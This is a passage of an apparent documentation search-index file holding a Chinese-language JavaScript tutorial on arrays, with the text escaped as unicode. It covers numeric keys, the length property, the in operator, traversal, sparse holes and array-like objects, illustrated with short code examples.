\u8bed\u8a00\u89c4\u5b9a\uff0c\u5bf9\u8c61\u7684\u952e\u540d\u4e00\u5f8b\u4e3a\u5b57\u7b26\u4e32\uff0c\u6240\u4ee5\uff0c\u6570\u7ec4\u7684\u952e\u540d\u5176\u5b9e\u4e5f\u662f\u5b57\u7b26\u4e32\u3002\u4e4b\u6240\u4ee5\u53ef\u4ee5\u7528\u6570\u503c\u8bfb\u53d6\uff0c\u662f\u56e0\u4e3a\u975e\u5b57\u7b26\u4e32\u7684\u952e\u540d\u4f1a\u88ab\u8f6c\u4e3a\u5b57\u7b26\u4e32\u3002 1 2 3 4 var arr = [ 'a' , 'b' , 'c' ]; arr [ '0' ] // 'a' arr [ 0 ] // 'a' \u4e0a\u9762\u4ee3\u7801\u5206\u522b\u7528\u6570\u503c\u548c\u5b57\u7b26\u4e32\u4f5c\u4e3a\u952e\u540d\uff0c\u7ed3\u679c\u90fd\u80fd\u8bfb\u53d6\u6570\u7ec4\u3002\u539f\u56e0\u662f\u6570\u503c\u952e\u540d\u88ab\u81ea\u52a8\u8f6c\u4e3a\u4e86\u5b57\u7b26\u4e32\u3002 \u6ce8\u610f\uff0c\u8fd9\u70b9\u5728\u8d4b\u503c\u65f6\u4e5f\u6210\u7acb\u3002\u4e00\u4e2a\u503c\u603b\u662f\u5148\u8f6c\u6210\u5b57\u7b26\u4e32\uff0c\u518d\u4f5c\u4e3a\u952e\u540d\u8fdb\u884c\u8d4b\u503c\u3002 1 2 3 4 var a = []; a [ 1.00 ] = 6 ; a [ 1 ] // 6 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7531\u4e8e 1.00 \u8f6c\u6210\u5b57\u7b26\u4e32\u662f 1 \uff0c\u6240\u4ee5\u901a\u8fc7\u6570\u5b57\u952e 1 \u53ef\u4ee5\u8bfb\u53d6\u503c\u3002 \u4e0a\u4e00\u7ae0\u8bf4\u8fc7\uff0c\u5bf9\u8c61\u6709\u4e24\u79cd\u8bfb\u53d6\u6210\u5458\u7684\u65b9\u6cd5\uff1a\u70b9\u7ed3\u6784\uff08 object.key \uff09\u548c\u65b9\u62ec\u53f7\u7ed3\u6784\uff08 object[key] \uff09\u3002\u4f46\u662f\uff0c\u5bf9\u4e8e\u6570\u503c\u7684\u952e\u540d\uff0c\u4e0d\u80fd\u4f7f\u7528\u70b9\u7ed3\u6784\u3002 1 2 var arr = [ 1 , 2 , 3 ]; arr .0 // SyntaxError \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c arr.0 \u7684\u5199\u6cd5\u4e0d\u5408\u6cd5\uff0c\u56e0\u4e3a\u5355\u72ec\u7684\u6570\u503c\u4e0d\u80fd\u4f5c\u4e3a\u6807\u8bc6\u7b26\uff08identifier\uff09\u3002\u6240\u4ee5\uff0c\u6570\u7ec4\u6210\u5458\u53ea\u80fd\u7528\u65b9\u62ec\u53f7 arr[0] \u8868\u793a\uff08\u65b9\u62ec\u53f7\u662f\u8fd0\u7b97\u7b26\uff0c\u53ef\u4ee5\u63a5\u53d7\u6570\u503c\uff09\u3002 length \u5c5e\u6027 \u00b6 \u6570\u7ec4\u7684 length \u5c5e\u6027\uff0c\u8fd4\u56de\u6570\u7ec4\u7684\u6210\u5458\u6570\u91cf\u3002 1 [ 'a' , 'b' , 'c' ]. length // 3 JavaScript \u4f7f\u7528\u4e00\u4e2a32\u4f4d\u6574\u6570\uff0c\u4fdd\u5b58\u6570\u7ec4\u7684\u5143\u7d20\u4e2a\u6570\u3002\u8fd9\u610f\u5473\u7740\uff0c\u6570\u7ec4\u6210\u5458\u6700\u591a\u53ea\u6709 4294967295 \u4e2a\uff082 32 - 1\uff09\u4e2a\uff0c\u4e5f\u5c31\u662f\u8bf4 length \u5c5e\u6027\u7684\u6700\u5927\u503c\u5c31\u662f 4294967295\u3002 \u53ea\u8981\u662f\u6570\u7ec4\uff0c\u5c31\u4e00\u5b9a\u6709 length \u5c5e\u6027\u3002\u8be5\u5c5e\u6027\u662f\u4e00\u4e2a\u52a8\u6001\u7684\u503c\uff0c\u7b49\u4e8e\u952e\u540d\u4e2d\u7684\u6700\u5927\u6574\u6570\u52a0\u4e0a 1 \u3002 1 2 3 4 5 6 7 8 9 10 11 var arr = [ 'a' , 'b' ]; arr . length // 2 arr [ 2 ] = 'c' ; arr . length // 3 arr [ 9 ] = 'd' ; arr . length // 10 arr [ 1000 ] = 'e' ; arr . length // 1001 \u4e0a\u9762\u4ee3\u7801\u8868\u793a\uff0c\u6570\u7ec4\u7684\u6570\u5b57\u952e\u4e0d\u9700\u8981\u8fde\u7eed\uff0c length \u5c5e\u6027\u7684\u503c\u603b\u662f\u6bd4\u6700\u5927\u7684\u90a3\u4e2a\u6574\u6570\u952e\u5927 1 \u3002\u53e6\u5916\uff0c\u8fd9\u4e5f\u8868\u660e\u6570\u7ec4\u662f\u4e00\u79cd\u52a8\u6001\u7684\u6570\u636e\u7ed3\u6784\uff0c\u53ef\u4ee5\u968f\u65f6\u589e\u51cf\u6570\u7ec4\u7684\u6210\u5458\u3002 length \u5c5e\u6027\u662f\u53ef\u5199\u7684\u3002\u5982\u679c\u4eba\u4e3a\u8bbe\u7f6e\u4e00\u4e2a\u5c0f\u4e8e\u5f53\u524d\u6210\u5458\u4e2a\u6570\u7684\u503c\uff0c\u8be5\u6570\u7ec4\u7684\u6210\u5458\u6570\u91cf\u4f1a\u81ea\u52a8\u51cf\u5c11\u5230 length \u8bbe\u7f6e\u7684\u503c\u3002 1 2 3 4 5 var arr = [ 'a' , 'b' , 'c' ]; arr . length // 3 arr . length = 2 ; arr // [\"a\", \"b\"] \u4e0a\u9762\u4ee3\u7801\u8868\u793a\uff0c\u5f53\u6570\u7ec4\u7684 length \u5c5e\u6027\u8bbe\u4e3a2\uff08\u5373\u6700\u5927\u7684\u6574\u6570\u952e\u53ea\u80fd\u662f1\uff09\u90a3\u4e48\u6574\u6570\u952e2\uff08\u503c\u4e3a c \uff09\u5c31\u5df2\u7ecf\u4e0d\u5728\u6570\u7ec4\u4e2d\u4e86\uff0c\u88ab\u81ea\u52a8\u5220\u9664\u4e86\u3002 \u6e05\u7a7a\u6570\u7ec4\u7684\u4e00\u4e2a\u6709\u6548\u65b9\u6cd5\uff0c\u5c31\u662f\u5c06 length \u5c5e\u6027\u8bbe\u4e3a0\u3002 1 2 3 4 var arr = [ 'a' , 'b' , 'c' ]; arr . length = 0 ; arr // [] \u5982\u679c\u4eba\u4e3a\u8bbe\u7f6e length \u5927\u4e8e\u5f53\u524d\u5143\u7d20\u4e2a\u6570\uff0c\u5219\u6570\u7ec4\u7684\u6210\u5458\u6570\u91cf\u4f1a\u589e\u52a0\u5230\u8fd9\u4e2a\u503c\uff0c\u65b0\u589e\u7684\u4f4d\u7f6e\u90fd\u662f\u7a7a\u4f4d\u3002 1 2 3 4 var a = [ 'a' ]; a . length = 3 ; a [ 1 ] // undefined \u4e0a\u9762\u4ee3\u7801\u8868\u793a\uff0c\u5f53 length \u5c5e\u6027\u8bbe\u4e3a\u5927\u4e8e\u6570\u7ec4\u4e2a\u6570\u65f6\uff0c\u8bfb\u53d6\u65b0\u589e\u7684\u4f4d\u7f6e\u90fd\u4f1a\u8fd4\u56de undefined \u3002 \u5982\u679c\u4eba\u4e3a\u8bbe\u7f6e length \u4e3a\u4e0d\u5408\u6cd5\u7684\u503c\uff0cJavaScript \u4f1a\u62a5\u9519\u3002 1 2 3 4 5 6 7 8 9 10 11 // \u8bbe\u7f6e\u8d1f\u503c []. length = - 1 // RangeError: Invalid array length // \u6570\u7ec4\u5143\u7d20\u4e2a\u6570\u5927\u4e8e\u7b49\u4e8e2\u768432\u6b21\u65b9 []. length = Math . pow ( 2 , 32 ) // RangeError: Invalid array length // \u8bbe\u7f6e\u5b57\u7b26\u4e32 []. length = 'abc' // RangeError: Invalid array length \u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u7531\u4e8e\u6570\u7ec4\u672c\u8d28\u4e0a\u662f\u4e00\u79cd\u5bf9\u8c61\uff0c\u6240\u4ee5\u53ef\u4ee5\u4e3a\u6570\u7ec4\u6dfb\u52a0\u5c5e\u6027\uff0c\u4f46\u662f\u8fd9\u4e0d\u5f71\u54cd length \u5c5e\u6027\u7684\u503c\u3002 1 2 3 4 5 6 7 var a = []; a [ 'p' ] = 'abc' ; a . length // 0 a [ 2.1 ] = 'abc' ; a . length // 0 \u4e0a\u9762\u4ee3\u7801\u5c06\u6570\u7ec4\u7684\u952e\u5206\u522b\u8bbe\u4e3a\u5b57\u7b26\u4e32\u548c\u5c0f\u6570\uff0c\u7ed3\u679c\u90fd\u4e0d\u5f71\u54cd length \u5c5e\u6027\u3002\u56e0\u4e3a\uff0c length \u5c5e\u6027\u7684\u503c\u5c31\u662f\u7b49\u4e8e\u6700\u5927\u7684\u6570\u5b57\u952e\u52a01\uff0c\u800c\u8fd9\u4e2a\u6570\u7ec4\u6ca1\u6709\u6574\u6570\u952e\uff0c\u6240\u4ee5 length \u5c5e\u6027\u4fdd\u6301\u4e3a 0 \u3002 \u5982\u679c\u6570\u7ec4\u7684\u952e\u540d\u662f\u6dfb\u52a0\u8d85\u51fa\u8303\u56f4\u7684\u6570\u503c\uff0c\u8be5\u952e\u540d\u4f1a\u81ea\u52a8\u8f6c\u4e3a\u5b57\u7b26\u4e32\u3002 1 2 3 4 5 6 7 var arr = []; arr [ - 1 ] = 'a' ; arr [ Math . pow ( 2 , 32 )] = 'b' ; arr . length // 0 arr [ - 1 ] // \"a\" arr [ 4294967296 ] // \"b\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6211\u4eec\u4e3a\u6570\u7ec4 arr \u6dfb\u52a0\u4e86\u4e24\u4e2a\u4e0d\u5408\u6cd5\u7684\u6570\u5b57\u952e\uff0c\u7ed3\u679c length \u5c5e\u6027\u6ca1\u6709\u53d1\u751f\u53d8\u5316\u3002\u8fd9\u4e9b\u6570\u5b57\u952e\u90fd\u53d8\u6210\u4e86\u5b57\u7b26\u4e32\u952e\u540d\u3002\u6700\u540e\u4e24\u884c\u4e4b\u6240\u4ee5\u4f1a\u53d6\u5230\u503c\uff0c\u662f\u56e0\u4e3a\u53d6\u952e\u503c\u65f6\uff0c\u6570\u5b57\u952e\u540d\u4f1a\u9ed8\u8ba4\u8f6c\u4e3a\u5b57\u7b26\u4e32\u3002 in \u8fd0\u7b97\u7b26 \u00b6 \u68c0\u67e5\u67d0\u4e2a\u952e\u540d\u662f\u5426\u5b58\u5728\u7684\u8fd0\u7b97\u7b26 in \uff0c\u9002\u7528\u4e8e\u5bf9\u8c61\uff0c\u4e5f\u9002\u7528\u4e8e\u6570\u7ec4\u3002 1 2 3 4 var arr = [ 'a' , 'b' , 'c' ]; 2 in arr // true '2' in arr // true 4 in arr // false \u4e0a\u9762\u4ee3\u7801\u8868\u660e\uff0c\u6570\u7ec4\u5b58\u5728\u952e\u540d\u4e3a 2 \u7684\u952e\u3002\u7531\u4e8e\u952e\u540d\u90fd\u662f\u5b57\u7b26\u4e32\uff0c\u6240\u4ee5\u6570\u503c 2 \u4f1a\u81ea\u52a8\u8f6c\u6210\u5b57\u7b26\u4e32\u3002 \u6ce8\u610f\uff0c\u5982\u679c\u6570\u7ec4\u7684\u67d0\u4e2a\u4f4d\u7f6e\u662f\u7a7a\u4f4d\uff0c in \u8fd0\u7b97\u7b26\u8fd4\u56de false \u3002 1 2 3 4 5 var arr = []; arr [ 100 ] = 'a' ; 100 in arr // true 1 in arr // false \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6570\u7ec4 arr \u53ea\u6709\u4e00\u4e2a\u6210\u5458 arr[100] \uff0c\u5176\u4ed6\u4f4d\u7f6e\u7684\u952e\u540d\u90fd\u4f1a\u8fd4\u56de false \u3002 for...in \u5faa\u73af\u548c\u6570\u7ec4\u7684\u904d\u5386 \u00b6 for...in \u5faa\u73af\u4e0d\u4ec5\u53ef\u4ee5\u904d\u5386\u5bf9\u8c61\uff0c\u4e5f\u53ef\u4ee5\u904d\u5386\u6570\u7ec4\uff0c\u6bd5\u7adf\u6570\u7ec4\u53ea\u662f\u4e00\u79cd\u7279\u6b8a\u5bf9\u8c61\u3002 1 2 3 4 5 6 7 8 var a = [ 1 , 2 , 3 ]; for ( var i in a ) { console . log ( a [ i ]); } // 1 // 2 // 3 \u4f46\u662f\uff0c for...in \u4e0d\u4ec5\u4f1a\u904d\u5386\u6570\u7ec4\u6240\u6709\u7684\u6570\u5b57\u952e\uff0c\u8fd8\u4f1a\u904d\u5386\u975e\u6570\u5b57\u952e\u3002 1 2 3 4 5 6 7 8 9 10 var a = [ 1 , 2 , 3 ]; a . foo = true ; for ( var key in a ) { console . log ( key ); } // 0 // 1 // 2 // foo \u4e0a\u9762\u4ee3\u7801\u5728\u904d\u5386\u6570\u7ec4\u65f6\uff0c\u4e5f\u904d\u5386\u5230\u4e86\u975e\u6574\u6570\u952e foo \u3002\u6240\u4ee5\uff0c\u4e0d\u63a8\u8350\u4f7f\u7528 for...in \u904d\u5386\u6570\u7ec4\u3002 \u6570\u7ec4\u7684\u904d\u5386\u53ef\u4ee5\u8003\u8651\u4f7f\u7528 for \u5faa\u73af\u6216 while \u5faa\u73af\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 var a = [ 1 , 2 , 3 ]; // for\u5faa\u73af for ( var i = 0 ; i < a . length ; i ++ ) { console . log ( a [ i ]); } // while\u5faa\u73af var i = 0 ; while ( i < a . length ) { console . log ( a [ i ]); i ++ ; } var l = a . length ; while ( l -- ) { console . log ( a [ l ]); } \u4e0a\u9762\u4ee3\u7801\u662f\u4e09\u79cd\u904d\u5386\u6570\u7ec4\u7684\u5199\u6cd5\u3002\u6700\u540e\u4e00\u79cd\u5199\u6cd5\u662f\u9006\u5411\u904d\u5386\uff0c\u5373\u4ece\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u5411\u7b2c\u4e00\u4e2a\u5143\u7d20\u904d\u5386\u3002 \u6570\u7ec4\u7684 forEach \u65b9\u6cd5\uff0c\u4e5f\u53ef\u4ee5\u7528\u6765\u904d\u5386\u6570\u7ec4\uff0c\u8be6\u89c1\u300a\u6807\u51c6\u5e93\u300b\u7684 Array \u5bf9\u8c61\u4e00\u7ae0\u3002 1 2 3 4 5 6 7 var colors = [ 'red' , 'green' , 'blue' ]; colors . forEach ( function ( color ) { console . log ( color ); }); // red // green // blue \u6570\u7ec4\u7684\u7a7a\u4f4d \u00b6 \u5f53\u6570\u7ec4\u7684\u67d0\u4e2a\u4f4d\u7f6e\u662f\u7a7a\u5143\u7d20\uff0c\u5373\u4e24\u4e2a\u9017\u53f7\u4e4b\u95f4\u6ca1\u6709\u4efb\u4f55\u503c\uff0c\u6211\u4eec\u79f0\u8be5\u6570\u7ec4\u5b58\u5728\u7a7a\u4f4d\uff08hole\uff09\u3002 1 2 var a = [ 1 , , 1 ]; a . length // 3 \u4e0a\u9762\u4ee3\u7801\u8868\u660e\uff0c\u6570\u7ec4\u7684\u7a7a\u4f4d\u4e0d\u5f71\u54cd length \u5c5e\u6027\u3002\u867d\u7136\u8fd9\u4e2a\u4f4d\u7f6e\u6ca1\u6709\u503c\uff0c\u5f15\u64ce\u4f9d\u7136\u8ba4\u4e3a\u8fd9\u4e2a\u4f4d\u7f6e\u662f\u6709\u6548\u7684\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5982\u679c\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u540e\u9762\u6709\u9017\u53f7\uff0c\u5e76\u4e0d\u4f1a\u4ea7\u751f\u7a7a\u4f4d\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u6709\u6ca1\u6709\u8fd9\u4e2a\u9017\u53f7\uff0c\u7ed3\u679c\u90fd\u662f\u4e00\u6837\u7684\u3002 1 2 3 4 var a = [ 1 , 2 , 3 ,]; a . length // 3 a // [1, 2, 3] \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6570\u7ec4\u6700\u540e\u4e00\u4e2a\u6210\u5458\u540e\u9762\u6709\u4e00\u4e2a\u9017\u53f7\uff0c\u8fd9\u4e0d\u5f71\u54cd length \u5c5e\u6027\u7684\u503c\uff0c\u4e0e\u6ca1\u6709\u8fd9\u4e2a\u9017\u53f7\u65f6\u6548\u679c\u4e00\u6837\u3002 \u6570\u7ec4\u7684\u7a7a\u4f4d\u662f\u53ef\u4ee5\u8bfb\u53d6\u7684\uff0c\u8fd4\u56de undefined \u3002 1 2 var a = [, , ,]; a [ 1 ] // undefined \u4f7f\u7528 delete \u547d\u4ee4\u5220\u9664\u4e00\u4e2a\u6570\u7ec4\u6210\u5458\uff0c\u4f1a\u5f62\u6210\u7a7a\u4f4d\uff0c\u5e76\u4e14\u4e0d\u4f1a\u5f71\u54cd length \u5c5e\u6027\u3002 1 2 3 4 5 var a = [ 1 , 2 , 3 ]; delete a [ 1 ]; a [ 1 ] // undefined a . length // 3 \u4e0a\u9762\u4ee3\u7801\u7528 delete \u547d\u4ee4\u5220\u9664\u4e86\u6570\u7ec4\u7684\u7b2c\u4e8c\u4e2a\u5143\u7d20\uff0c\u8fd9\u4e2a\u4f4d\u7f6e\u5c31\u5f62\u6210\u4e86\u7a7a\u4f4d\uff0c\u4f46\u662f\u5bf9 length \u5c5e\u6027\u6ca1\u6709\u5f71\u54cd\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c length \u5c5e\u6027\u4e0d\u8fc7\u6ee4\u7a7a\u4f4d\u3002\u6240\u4ee5\uff0c\u4f7f\u7528 length \u5c5e\u6027\u8fdb\u884c\u6570\u7ec4\u904d\u5386\uff0c\u4e00\u5b9a\u8981\u975e\u5e38\u5c0f\u5fc3\u3002 \u6570\u7ec4\u7684\u67d0\u4e2a\u4f4d\u7f6e\u662f\u7a7a\u4f4d\uff0c\u4e0e\u67d0\u4e2a\u4f4d\u7f6e\u662f undefined \uff0c\u662f\u4e0d\u4e00\u6837\u7684\u3002\u5982\u679c\u662f\u7a7a\u4f4d\uff0c\u4f7f\u7528\u6570\u7ec4\u7684 forEach \u65b9\u6cd5\u3001 for...in \u7ed3\u6784\u3001\u4ee5\u53ca Object.keys \u65b9\u6cd5\u8fdb\u884c\u904d\u5386\uff0c\u7a7a\u4f4d\u90fd\u4f1a\u88ab\u8df3\u8fc7\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 var a = [, , ,]; a . forEach ( function ( x , i ) { console . log ( i + '. ' + x ); }) // \u4e0d\u4ea7\u751f\u4efb\u4f55\u8f93\u51fa for ( var i in a ) { console . log ( i ); } // \u4e0d\u4ea7\u751f\u4efb\u4f55\u8f93\u51fa Object . keys ( a ) // [] \u5982\u679c\u67d0\u4e2a\u4f4d\u7f6e\u662f undefined \uff0c\u904d\u5386\u7684\u65f6\u5019\u5c31\u4e0d\u4f1a\u88ab\u8df3\u8fc7\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 var a = [ undefined , undefined , undefined ]; a . forEach ( function ( x , i ) { console . log ( i + '. ' + x ); }); // 0. undefined // 1. undefined // 2. undefined for ( var i in a ) { console . log ( i ); } // 0 // 1 // 2 Object . keys ( a ) // ['0', '1', '2'] \u8fd9\u5c31\u662f\u8bf4\uff0c\u7a7a\u4f4d\u5c31\u662f\u6570\u7ec4\u6ca1\u6709\u8fd9\u4e2a\u5143\u7d20\uff0c\u6240\u4ee5\u4e0d\u4f1a\u88ab\u904d\u5386\u5230\uff0c\u800c undefined \u5219\u8868\u793a\u6570\u7ec4\u6709\u8fd9\u4e2a\u5143\u7d20\uff0c\u503c\u662f undefined \uff0c\u6240\u4ee5\u904d\u5386\u4e0d\u4f1a\u8df3\u8fc7\u3002 \u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61 \u00b6 \u5982\u679c\u4e00\u4e2a\u5bf9\u8c61\u7684\u6240\u6709\u952e\u540d\u90fd\u662f\u6b63\u6574\u6570\u6216\u96f6\uff0c\u5e76\u4e14\u6709 length \u5c5e\u6027\uff0c\u90a3\u4e48\u8fd9\u4e2a\u5bf9\u8c61\u5c31\u5f88\u50cf\u6570\u7ec4\uff0c\u8bed\u6cd5\u4e0a\u79f0\u4e3a\u201c\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\u201d\uff08array-like object\uff09\u3002 1 2 3 4 5 6 7 8 9 10 11 var obj = { 0 : 'a' , 1 : 'b' , 2 : 'c' , length : 3 }; obj [ 0 ] // 'a' obj [ 1 ] // 'b' obj . length // 3 obj . push ( 'd' ) // TypeError: obj.push is not a function \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5bf9\u8c61 obj \u5c31\u662f\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\u3002\u4f46\u662f\uff0c\u201c\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\u201d\u5e76\u4e0d\u662f\u6570\u7ec4\uff0c\u56e0\u4e3a\u5b83\u4eec\u4e0d\u5177\u5907\u6570\u7ec4\u7279\u6709\u7684\u65b9\u6cd5\u3002\u5bf9\u8c61 obj \u6ca1\u6709\u6570\u7ec4\u7684 push \u65b9\u6cd5\uff0c\u4f7f\u7528\u8be5\u65b9\u6cd5\u5c31\u4f1a\u62a5\u9519\u3002 \u201c\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\u201d\u7684\u6839\u672c\u7279\u5f81\uff0c\u5c31\u662f\u5177\u6709 length \u5c5e\u6027\u3002\u53ea\u8981\u6709 length \u5c5e\u6027\uff0c\u5c31\u53ef\u4ee5\u8ba4\u4e3a\u8fd9\u4e2a\u5bf9\u8c61\u7c7b\u4f3c\u4e8e\u6570\u7ec4\u3002\u4f46\u662f\u6709\u4e00\u4e2a\u95ee\u9898\uff0c\u8fd9\u79cd length \u5c5e\u6027\u4e0d\u662f\u52a8\u6001\u503c\uff0c\u4e0d\u4f1a\u968f\u7740\u6210\u5458\u7684\u53d8\u5316\u800c\u53d8\u5316\u3002 1 2 3 4 5 var obj = { length : 0 }; obj [ 3 ] = 'd' ; obj . length // 0 \u4e0a\u9762\u4ee3\u7801\u4e3a\u5bf9\u8c61 obj \u6dfb\u52a0\u4e86\u4e00\u4e2a\u6570\u5b57\u952e\uff0c\u4f46\u662f length \u5c5e\u6027\u6ca1\u53d8\u3002\u8fd9\u5c31\u8bf4\u660e\u4e86 obj \u4e0d\u662f\u6570\u7ec4\u3002 \u5178\u578b\u7684\u201c\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\u201d\u662f\u51fd\u6570\u7684 arguments \u5bf9\u8c61\uff0c\u4ee5\u53ca\u5927\u591a\u6570 DOM \u5143\u7d20\u96c6\uff0c\u8fd8\u6709\u5b57\u7b26\u4e32\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 // arguments\u5bf9\u8c61 function args () { return arguments } var arrayLike = args ( 'a' , 'b' ); arrayLike [ 0 ] // 'a' arrayLike . length // 2 arrayLike instanceof Array // false // DOM\u5143\u7d20\u96c6 var elts = document . getElementsByTagName ( 'h3' ); elts . length // 3 elts instanceof Array // false // \u5b57\u7b26\u4e32 'abc' [ 1 ] // 'b' 'abc' . length // 3 'abc' instanceof Array // false \u4e0a\u9762\u4ee3\u7801\u5305\u542b\u4e09\u4e2a\u4f8b\u5b50\uff0c\u5b83\u4eec\u90fd\u4e0d\u662f\u6570\u7ec4\uff08 instanceof \u8fd0\u7b97\u7b26\u8fd4\u56de false \uff09\uff0c\u4f46\u662f\u770b\u4e0a\u53bb\u90fd\u975e\u5e38\u50cf\u6570\u7ec4\u3002 \u6570\u7ec4\u7684 slice \u65b9\u6cd5\u53ef\u4ee5\u5c06\u201c\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\u201d\u53d8\u6210\u771f\u6b63\u7684\u6570\u7ec4\u3002 1 var arr = Array . prototype . slice . call ( arrayLike ); \u9664\u4e86\u8f6c\u4e3a\u771f\u6b63\u7684\u6570\u7ec4\uff0c\u201c\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\u201d\u8fd8\u6709\u4e00\u4e2a\u529e\u6cd5\u53ef\u4ee5\u4f7f\u7528\u6570\u7ec4\u7684\u65b9\u6cd5\uff0c\u5c31\u662f\u901a\u8fc7 call() \u628a\u6570\u7ec4\u7684\u65b9\u6cd5\u653e\u5230\u5bf9\u8c61\u4e0a\u9762\u3002 1 2 3 4 5 function print ( value , index ) { console . log ( index + ' : ' + value ); } Array . prototype . forEach . call ( arrayLike , print ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c arrayLike \u4ee3\u8868\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff0c\u672c\u6765\u662f\u4e0d\u53ef\u4ee5\u4f7f\u7528\u6570\u7ec4\u7684 forEach() \u65b9\u6cd5\u7684\uff0c\u4f46\u662f\u901a\u8fc7 call() \uff0c\u53ef\u4ee5\u628a forEach() \u5ac1\u63a5\u5230 arrayLike \u4e0a\u9762\u8c03\u7528\u3002 \u4e0b\u9762\u7684\u4f8b\u5b50\u5c31\u662f\u901a\u8fc7\u8fd9\u79cd\u65b9\u6cd5\uff0c\u5728 arguments \u5bf9\u8c61\u4e0a\u9762\u8c03\u7528 forEach \u65b9\u6cd5\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 // forEach \u65b9\u6cd5 function logArgs () { Array . prototype . forEach . call ( arguments , function ( elem , i ) { console . log ( i + '. ' + elem ); }); } // \u7b49\u540c\u4e8e for \u5faa\u73af function logArgs () { for ( var i = 0 ; i < arguments . length ; i ++ ) { console . log ( i + '. ' + arguments [ i ]); } } \u5b57\u7b26\u4e32\u4e5f\u662f\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff0c\u6240\u4ee5\u4e5f\u53ef\u4ee5\u7528 Array.prototype.forEach.call \u904d\u5386\u3002 1 2 3 4 5 6 Array . prototype . forEach . call ( 'abc' , function ( chr ) { console . log ( chr ); }); // a // b // c \u6ce8\u610f\uff0c\u8fd9\u79cd\u65b9\u6cd5\u6bd4\u76f4\u63a5\u4f7f\u7528\u6570\u7ec4\u539f\u751f\u7684 forEach \u8981\u6162\uff0c\u6240\u4ee5\u6700\u597d\u8fd8\u662f\u5148\u5c06\u201c\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\u201d\u8f6c\u4e3a\u771f\u6b63\u7684\u6570\u7ec4\uff0c\u7136\u540e\u518d\u76f4\u63a5\u8c03\u7528\u6570\u7ec4\u7684 forEach \u65b9\u6cd5\u3002 1 2 3 4 5 6 7 var arr = Array . prototype . slice . call ( 'abc' ); arr . forEach ( function ( chr ) { console . log ( chr ); }); // a // b // c \u53c2\u8003\u94fe\u63a5 \u00b6 Axel Rauschmayer, Arrays in JavaScript Axel Rauschmayer, JavaScript: sparse arrays vs. dense arrays Felix Bohm, What They Didn\u2019t Tell You About ES5\u2032s Array Extras Juriy Zaytsev, How ECMAScript 5 still does not allow to subclass an array","title":"\u6570\u7ec4"},{"location":"types/array/#_1","text":"","title":"\u6570\u7ec4"},{"location":"types/array/#_2","text":"\u6570\u7ec4\uff08array\uff09\u662f\u6309\u6b21\u5e8f\u6392\u5217\u7684\u4e00\u7ec4\u503c\u3002\u6bcf\u4e2a\u503c\u7684\u4f4d\u7f6e\u90fd\u6709\u7f16\u53f7\uff08\u4ece0\u5f00\u59cb\uff09\uff0c\u6574\u4e2a\u6570\u7ec4\u7528\u65b9\u62ec\u53f7\u8868\u793a\u3002 1 var arr = [ 'a' , 'b' , 'c' ]; \u4e0a\u9762\u4ee3\u7801\u4e2d\u7684 a \u3001 b \u3001 c \u5c31\u6784\u6210\u4e00\u4e2a\u6570\u7ec4\uff0c\u4e24\u7aef\u7684\u65b9\u62ec\u53f7\u662f\u6570\u7ec4\u7684\u6807\u5fd7\u3002 a \u662f0\u53f7\u4f4d\u7f6e\uff0c b \u662f1\u53f7\u4f4d\u7f6e\uff0c c \u662f2\u53f7\u4f4d\u7f6e\u3002 \u9664\u4e86\u5728\u5b9a\u4e49\u65f6\u8d4b\u503c\uff0c\u6570\u7ec4\u4e5f\u53ef\u4ee5\u5148\u5b9a\u4e49\u540e\u8d4b\u503c\u3002 1 2 3 4 5 var arr = []; arr [ 0 ] = 'a' ; arr [ 1 ] = 'b' ; arr [ 2 ] = 'c' ; \u4efb\u4f55\u7c7b\u578b\u7684\u6570\u636e\uff0c\u90fd\u53ef\u4ee5\u653e\u5165\u6570\u7ec4\u3002 1 2 3 4 5 6 7 8 9 var arr = [ { a : 1 }, [ 1 , 2 , 3 ], function () { return true ;} ]; arr [ 0 ] // Object {a: 1} arr [ 1 ] // [1, 2, 3] arr [ 2 ] // function (){return true;} \u4e0a\u9762\u6570\u7ec4 arr \u76843\u4e2a\u6210\u5458\u4f9d\u6b21\u662f\u5bf9\u8c61\u3001\u6570\u7ec4\u3001\u51fd\u6570\u3002 \u5982\u679c\u6570\u7ec4\u7684\u5143\u7d20\u8fd8\u662f\u6570\u7ec4\uff0c\u5c31\u5f62\u6210\u4e86\u591a\u7ef4\u6570\u7ec4\u3002 1 2 3 var a = [[ 1 , 2 ], [ 3 , 4 ]]; a [ 0 ][ 1 ] // 2 a [ 1 ][ 1 ] // 4","title":"\u5b9a\u4e49"},{"location":"types/array/#_3","text":"\u672c\u8d28\u4e0a\uff0c\u6570\u7ec4\u5c5e\u4e8e\u4e00\u79cd\u7279\u6b8a\u7684\u5bf9\u8c61\u3002 typeof 